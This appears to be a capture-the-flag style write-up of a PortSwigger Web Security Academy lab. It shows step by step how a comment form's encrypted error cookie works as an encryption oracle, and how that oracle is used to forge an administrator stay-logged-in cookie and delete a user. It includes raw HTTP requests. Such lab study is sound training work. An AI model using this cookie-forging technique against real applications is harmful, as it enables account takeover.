## Authentication bypass via encryption oracle

This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /admin
- /login
- Stay-Logged-In functionality
- Possibility to leave a comment on a post

## Resume

1. Use invalid email to get encrypted `notification` cookie
2. Use `notification` cookie as encryption/decryption oracle
3. Decrypt `stay-logged-in` cookie
4. Forge administrator cookie
5. Remove `Invalid email address: ` prefix bytes
6. Login as administrator
7. Delete `carlos`

## Solve

Login with `Stay logged in` checked and post a comment with an invalid email. The application returns an encrypted `notification` cookie containing the reflected error message.

Send both requests to repeater and rename them `encrypt` and `decrypt`.

### Encrypt request

```http
POST /post/comment HTTP/2
Host: 0a1f0025031c13e080c58a5b000e0049.web-security-academy.net
Cookie: notification=auHGtuDjl5ocvWORyanzP9HcnEsUr1DUJt2IKuaz%2bRZ8KEG9rcjIv2qma4htJ2ljZ%2bIUjJP%2fFod%2fzbcTfK5hbh7r4X5dYP7FHfeyUFv33Y4%3d; stay-logged-in=iXLUDsCirXfARDJ14MsjIxaXpYax6B8FTsWpIfSkq3o%3d; session=9e2qKxEmpUQeWDMJFa9EZIdzXw17pgPV
Content-Length: 115
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a1f0025031c13e080c58a5b000e0049.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1f0025031c13e080c58a5b000e0049.web-security-academy.net/post?postId=5
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=OyH9kyhwSnIY4bo4lc4VxUWi99z2Jsmr&postId=5&comment=1&name=1&email=xxxxxxxxxadministrator:1778491763385&website=
```

### Decrypt request

```http
GET /post?postId=5 HTTP/2
Host: 0a1f0025031c13e080c58a5b000e0049.web-security-academy.net
Cookie: notification=auHGtuDjl5ocvWORyanzP%2bsDwiUxkJ46n31ntjPmIKHTL3VW%2bE2m8WltjUUgTyyCDGx2%2fM4fRPAQhzGJQSTNPg%3d%3d; stay-logged-in=iXLUDsCirXfARDJ14MsjIxaXpYax6B8FTsWpIfSkq3o%3d; session=9e2qKxEmpUQeWDMJFa9EZIdzXw17pgPV
Cache-Control: max-age=0
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a1f0025031c13e080c58a5b000e0049.web-security-academy.net/post?postId=5
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Replace the `notification` cookie in the decrypt request with the `stay-logged-in` cookie value. The response decrypts it and reveals :

```text
wiener:1778491763385
```

The cookie format is :

```text
username:timestamp
```

Keep the timestamp and go back to the encrypt request. Replace the email value with :

```text
xxxxxxxxxadministrator:1778491763385
```

The 9 `x` are used as padding because the application prepends :

```text
Invalid email address:
```

which is 23 bytes long. Adding 9 bytes makes it 32 bytes total, aligned on a 16-byte block boundary.

Send the request and copy the new `notification` cookie value. Send it to Burp Decoder then :

1. URL decode
2. Base64 decode

Switch to hex view and remove the first 32 bytes.

Re-encode everything :

1. Base64 encode
2. URL encode

Put the final value back into the `notification` cookie inside the decrypt request. The response now decrypts cleanly to :

```text
administrator:1778491763385
```

From proxy history, send a normal `GET /` request to repeater. Remove the `session` cookie and replace the `stay-logged-in` cookie with the forged ciphertext.

Send the request and you are now logged in as `administrator`.

Browse to :

```http
/admin
```

Then delete Carlos :

```http
/admin/delete?username=carlos
```